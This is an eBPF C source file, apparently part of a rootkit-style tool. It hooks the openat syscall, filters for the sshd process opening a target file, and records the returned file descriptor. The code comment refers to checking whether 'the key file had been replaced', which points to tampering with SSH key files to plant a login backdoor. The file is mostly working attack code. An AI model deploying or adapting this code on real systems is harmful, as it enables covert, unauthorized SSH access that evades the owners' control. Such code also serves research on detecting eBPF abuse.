#include "./common.h"
#include "./map.h"

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();

    char comm[TASK_COMM_LEN];
    if(bpf_get_current_comm(&comm, TASK_COMM_LEN)) {
        return 0;
    }

// when debug your can run python test/mock_sshd.py to check whether the key file had been replaced
#ifndef DEBUG
    const int target_comm_len = 5;
    const char *target_comm = "sshd";

    for (int i = 0; i < target_comm_len; i++)
    {
        if (comm[i] != target_comm[i])
        {
            return 0;
        }
    }
#endif

    char filename[27];

    // check whether openat file is target
    bpf_probe_read_user(&filename, target_file_len, (char *)ctx->args[1]);
    for (int i = 0; i < target_file_len; i++)
    {
        if (filename[i] != target_file[i])
        {
            return 0;
        }
    }

#ifdef DEBUG
    bpf_printk("Comm %s\n", comm);
    bpf_printk("Filename %s\n", filename);
#endif

    // If filtering by UID check that
    // if (uid != 0)
    // {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid)
        {
            return 0;
        }
    // }

#ifdef DEBUG
    bpf_printk("Add pid_tgid %d to map for our sys_exit call",pid_tgid);
#endif
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0)
    {
        return 0;
    }
    // int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    // unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}
